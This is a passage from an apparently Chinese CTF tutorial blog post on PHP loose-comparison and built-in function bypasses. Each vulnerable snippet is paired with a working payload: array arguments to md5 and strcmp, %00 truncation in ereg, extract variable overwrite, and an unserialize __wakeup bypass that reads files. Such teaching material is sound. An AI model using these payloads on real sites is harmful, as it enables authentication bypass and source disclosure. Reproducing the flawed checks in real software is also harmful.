class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  <span class="variable">$id</span> = intval(<span class="variable">$_GET</span>[id]);</span><br><span class="line">  <span class="variable">$query</span> = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='<span class="variable">$id</span>'"</span>));</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$_GET</span>[id]==1024) &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="variable">$query</span>[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Payload:   http://chinalover.sinaapp.com/web11/sql.php?id=1024.1</span><br></pre></td></tr></table></figure></p><h2 id="内置函数的参数的松散性"><a href="#内置函数的参数的松散性" class="headerlink" title="内置函数的参数的松散性"></a>内置函数的参数的松散性</h2><p>内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。</p><h3 id="md5、sha1-绕过"><a href="#md5、sha1-绕过" class="headerlink" title="md5、sha1 绕过"></a>md5、sha1 绕过</h3><p>md5、sha1 函数无法处理数组，处理结果都是 null<br>Example1:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'a'</span>] != <span class="variable">$_GET</span>[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">'b'</span>]))</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload: a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure></p><p>Example2：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'v1'</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">'v2'</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">'v1'</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; md5(<span class="variable">$v1</span>) == md5(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload: v1[]=1&amp;v2[]=2&amp;v3[]=3</span><br></pre></td></tr></table></figure></p><h3 id="ereg-函数漏洞：00-截断-00"><a href="#ereg-函数漏洞：00-截断-00" class="headerlink" title="ereg 函数漏洞：00 截断 %00"></a>ereg 函数漏洞：00 截断 %00</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ereg(string pattern, string string, array [regs]);</span><br></pre></td></tr></table></figure><p>本函数以 pattern 的规则来解析比对字符串 string。比对结果返回的值放在数组参数 regs 之中，regs[0] 内容就是原字符串 string、regs[1] 为第一个合乎规则的字符串、regs[2] 就是第二个合乎规则的字符串，余类推。若省略参数 regs，则只是单纯地比对，找到则返回值为 true。</p><p>Example1：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>,<span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)    </span><br><span class="line">       &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">'password'</span>]) &lt; 8 &amp;&amp; <span class="variable">$_GET</span>[<span class="string">'password'</span>] &gt; 9999999)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== FALSE)</span><br><span class="line">        &#123;</span><br><span class="line">            die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">Payload:  password=1e8%00*-*</span><br></pre></td></tr></table></figure></p><p>Example2：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br><span class="line">    <span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'nctf'</span>]) === FALSE)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== FALSE)   </span><br><span class="line">            die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">Payload1: nctf=1%00%23biubiubiu   <span class="comment">#要改成 %23 不然不行</span></span><br><span class="line">Payload2: nctf[]=1  因为ereg strpos 处理数组返回都是 null</span><br></pre></td></tr></table></figure></p><h3 id="strcmp-绕过"><a href="#strcmp-绕过" class="headerlink" title="strcmp() 绕过"></a>strcmp() 绕过</h3><p>如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br>5.2 中是将两个参数先转换成 string 类型。<br>5.3.3 以后，当比较数组和字符串的时候，返回是 null。<br>5.5 中如果参数不是 string 类型，直接 return 了<br>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="variable">$flag</span>) == 0)  </span><br><span class="line">        die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="built_in">print</span> <span class="string">'Invalid password'</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Payload: password[]=1   strcmp 处理数组直接返回 null</span><br></pre></td></tr></table></figure></p><h3 id="switch-绕过"><a href="#switch-绕过" class="headerlink" title="switch() 绕过"></a>switch() 绕过</h3><p>如果 switch 是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型。如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> =<span class="string">"2abc"</span>;</span><br><span class="line">switch (<span class="variable">$i</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> 0:</span><br><span class="line"><span class="keyword">case</span> 1:</span><br><span class="line"><span class="keyword">case</span> 2:</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">"i is less than 3 but not negative"</span>;</span><br><span class="line"> <span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> 3:</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">"i is 3"</span>;</span><br></pre></td></tr></table></figure></p><p>这个时候程序输出的是 i is less than 3 but not negative，是由于 switch() 函数将 $i 进行了类型转换，转换结果为 2。</p><h3 id="json-绕过"><a href="#json-绕过" class="headerlink" title="json() 绕过"></a>json() 绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">'message'</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload: message=&#123;<span class="string">"key"</span>:0&#125;     利用 0==<span class="string">"admin"</span></span><br></pre></td></tr></table></figure><h3 id="in-array-array-search-函数搜索数组中是否存在指定的值。"><a href="#in-array-array-search-函数搜索数组中是否存在指定的值。" class="headerlink" title="in_array()  array_search 函数搜索数组中是否存在指定的值。"></a>in_array()  array_search 函数搜索数组中是否存在指定的值。</h3><p>in_array array_search 介绍：(bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) ,如果 strict 参数没有提供，那么 in_array 就会使用松散比较来判断 $needle 是否在 $haystack 中。当 strince 的值为 true 时，in_array() 会比较 needls 的类型和 haystack 中的类型是否相同。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span>=[0,1,2,<span class="string">'3'</span>];</span><br><span class="line">var_dump(in_array(<span class="string">'abc'</span>, <span class="variable">$array</span>)); //<span class="literal">true</span></span><br><span class="line">var_dump(in_array(<span class="string">'1bc'</span>, <span class="variable">$array</span>)); //<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>可以看到上面的情况返回的都是 true,因为 ‘abc’ 会转换为 0，’1bc’ 转换为 1。<br>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"><span class="keyword">if</span>(!is_array(<span class="variable">$_GET</span>[<span class="string">'test'</span>]))&#123;<span class="built_in">exit</span>();&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">'test'</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;count(<span class="variable">$test</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$test</span>[<span class="variable">$i</span>]===<span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"error"</span>;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$test</span>[<span class="variable">$i</span>]=intval(<span class="variable">$test</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(array_search(<span class="string">"admin"</span>,<span class="variable">$test</span>)===0)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"false"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload: <span class="built_in">test</span>[]=0</span><br></pre></td></tr></table></figure></p><h3 id="extract-变量覆盖-—-从数组中将变量导入到当前的符号表"><a href="#extract-变量覆盖-—-从数组中将变量导入到当前的符号表" class="headerlink" title="extract 变量覆盖 — 从数组中将变量导入到当前的符号表"></a>extract 变量覆盖 — 从数组中将变量导入到当前的符号表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">extract(array,extract_rules,prefix) </span><br><span class="line"></span><br><span class="line">EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</span><br><span class="line">EXTR_SKIP - 如果有冲突，不覆盖已有的变量。（忽略数组中同名的元素）</span><br><span class="line">EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。</span><br><span class="line">EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix（第三个参数）。</span><br><span class="line">EXTR_PREFIX_INVALID - 仅在非法或数字变量名前加上前缀 prefix。</span><br><span class="line">EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。可以用在已经定义了一组合法的变量，然后要从一个数组例如 <span class="variable">$_REQUEST</span> 中提取值覆盖这些变量的场合。</span><br><span class="line">EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</span><br><span class="line">EXTR_REFS - 将变量作为引用提取。这有力地表明了导入的变量仍然引用了 var_array 参数的值。可以单独使用这个标志或者在 extract_type 中用 OR 与其它任何标志结合使用。</span><br></pre></td></tr></table></figure><p>extract 有三种形式可能导致变量覆盖!</p><p>第一种: EXTR_PREFIX_SAME</p><p>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$size</span>=<span class="string">"large"</span>;</span><br><span class="line"><span class="variable">$var_array</span>=array(</span><br><span class="line"><span class="string">"color"</span>=&gt;<span class="string">"blue"</span>,</span><br><span class="line"><span class="string">"size"</span>=&gt;<span class="string">"medium"</span>,</span><br><span class="line"><span class="string">"shape"</span>=&gt;<span class="string">"round"</span></span><br><span class="line">);</span><br><span class="line">extract(<span class="variable">$var_array</span>,EXTR_PREFIX_SAME,<span class="string">"test"</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$color</span>,<span class="variable">$size</span>,<span class="variable">$shape</span>,<span class="variable">$test_size</span>"</span>;</span><br></pre></td></tr></table></figure></p><p>输出为：bule large  round  medium    最后一个 size 变量被覆盖</p><p>第二种: EXTR_OVERWRITE 或者省略 EXTR_OVERWRITE</p><p>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$size</span>=<span class="string">"large"</span>;</span><br><span class="line"><span class="variable">$var_array</span>=array(</span><br><span class="line"><span class="string">"color"</span>=&gt;<span class="string">"blue"</span>,</span><br><span class="line"><span class="string">"size"</span>=&gt;<span class="string">"medium"</span>,</span><br><span class="line"><span class="string">"shape"</span>=&gt;<span class="string">"round"</span></span><br><span class="line">);</span><br><span class="line">extract(<span class="variable">$var_array</span>,EXTR_OVERWRITE);  或者 extract(<span class="variable">$var_array</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$color</span>,<span class="variable">$size</span>,<span class="variable">$shape</span>"</span>;</span><br></pre></td></tr></table></figure></p><p>输出为：bule medium  round      size 变量被覆盖</p><p>第三种: EXTR_IF_EXISTS</p><p>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$size</span>=<span class="string">"large"</span>;</span><br><span class="line"><span class="variable">$var_array</span>=array(</span><br><span class="line"><span class="string">"color"</span>=&gt;<span class="string">"blue"</span>,</span><br><span class="line"><span class="string">"size"</span>=&gt;<span class="string">"medium"</span>,</span><br><span class="line"><span class="string">"shape"</span>=&gt;<span class="string">"round"</span></span><br><span class="line">);</span><br><span class="line">extract(<span class="variable">$var_array</span>,EXTR_IF_EXISTS);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$size</span>"</span>;</span><br></pre></td></tr></table></figure></p><p>输出为：medium size 变量被覆盖</p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123; </span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pass</span> == <span class="variable">$thepassword_123</span>) &#123; </span><br><span class="line">        &lt;?php <span class="built_in">echo</span> <span class="variable">$theflag</span>; ?&gt;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">payload:pass=a&amp;thepassword_123=a</span><br></pre></td></tr></table></figure></p><h3 id="serialize-和-unserialize-漏洞序列化与反序列化简单介绍"><a href="#serialize-和-unserialize-漏洞序列化与反序列化简单介绍" class="headerlink" title="serialize 和 unserialize 漏洞序列化与反序列化简单介绍"></a>serialize 和 unserialize 漏洞序列化与反序列化简单介绍</h3><p>序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等函数 : serialize()<br>反序列化:恢复原先被序列化的变量 函数: unserialize()</p><p>Example1:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$test1</span> = <span class="string">"hello world"</span>;</span><br><span class="line"><span class="variable">$test2</span> = array(<span class="string">"hello"</span>,<span class="string">"world"</span>);</span><br><span class="line"><span class="variable">$test3</span> = 123456;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$test1</span>); //  s:11:<span class="string">"hello world"</span>;  序列化字符串</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$test2</span>); // a:2:&#123;i:0;s:5:<span class="string">"hello"</span>;i:1;s:5:<span class="string">"world"</span>;&#125; 序列化数组</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$test3</span>); //  i:123456;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>Example2:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class hello&#123;</span><br><span class="line">    public <span class="variable">$test4</span> = <span class="string">"hello,world"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = new hello();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$test</span>);</span><br><span class="line">?&gt;</span><br><span class="line"> //  O:5:<span class="string">"hello"</span>:1:&#123;s:5:<span class="string">"test4"</span>;s:11:<span class="string">"hello,world"</span>;&#125;  序列化对象  首字母代表参数类型 O-&gt;Objext S-&gt;String...</span><br></pre></td></tr></table></figure></p><p>序列化 public private protect 参数产生不同结果</p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    private <span class="variable">$test1</span>=<span class="string">"hello"</span>;</span><br><span class="line">    public <span class="variable">$test2</span>=<span class="string">"hello"</span>;</span><br><span class="line">    protected <span class="variable">$test3</span>=<span class="string">"hello"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = new <span class="built_in">test</span>();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$test</span>); </span><br><span class="line">?&gt;</span><br><span class="line">//  O:4:<span class="string">"test"</span>:3:&#123;s:11:<span class="string">" test test1"</span>;s:5:<span class="string">"hello"</span>;s:5:<span class="string">"test2"</span>;s:5:<span class="string">"hello"</span>;s:8:<span class="string">" * test3"</span>;s:5:<span class="string">"hello"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>test 类定义了三个不同类型(私有，公有，保护)但是值相同的字符串，序列化输出的值不相同<br>通过对网页抓取输出是这样的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">"test"</span>:3:&#123;s:11:<span class="string">"\00test\00test1"</span>;s:5:<span class="string">"hello"</span>;s:5:<span class="string">"test2"</span>;s:5:<span class="string">"hello"</span>;s:8:<span class="string">"\00*\00test3"</span>;s:5:<span class="string">"hello"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    error_reporting(0); </span><br><span class="line">    class sercet&#123; </span><br><span class="line">        private <span class="variable">$file</span>=<span class="string">'index.php'</span>; </span><br><span class="line">        public <span class="keyword">function</span> __construct(<span class="variable">$file</span>)&#123; </span><br><span class="line">            <span class="variable">$this</span>-&gt;file=<span class="variable">$file</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123; </span><br><span class="line">            <span class="built_in">echo</span> show_source(<span class="variable">$this</span>-&gt;file,<span class="literal">true</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123; </span><br><span class="line">            <span class="variable">$this</span>-&gt;file=<span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="variable">$cmd</span>=cmd00; </span><br><span class="line">    <span class="keyword">if</span> (!isset(<span class="variable">$_GET</span>[<span class="variable">$cmd</span>]))&#123; </span><br><span class="line">        <span class="built_in">echo</span> show_source(<span class="string">'index.php'</span>,<span class="literal">true</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$cmd</span>=base64_decode(<span class="variable">$_GET</span>[<span class="variable">$cmd</span>]); </span><br><span class="line">        <span class="keyword">if</span> ((preg_match(<span class="string">'/[oc]:\d+:/i'</span>,<span class="variable">$cmd</span>))||(preg_match(<span class="string">'/flag/i'</span>,<span class="variable">$cmd</span>)))&#123; </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Are u gaoshing?"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            unserialize(<span class="variable">$cmd</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">?&gt; </span><br><span class="line">//sercet <span class="keyword">in</span> the_next.php</span><br></pre></td></tr></table></figure></p><p>绕过正则可以用+号 绕过 __weakup 当成员属性数目大于实际数目时可绕过 wakeup<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:O:+6:<span class="string">"sercet"</span>:2:&#123;S:12:<span class="string">"\00sercet\00file"</span>;s:12:<span class="string">"the_next.php"</span>;&#125;  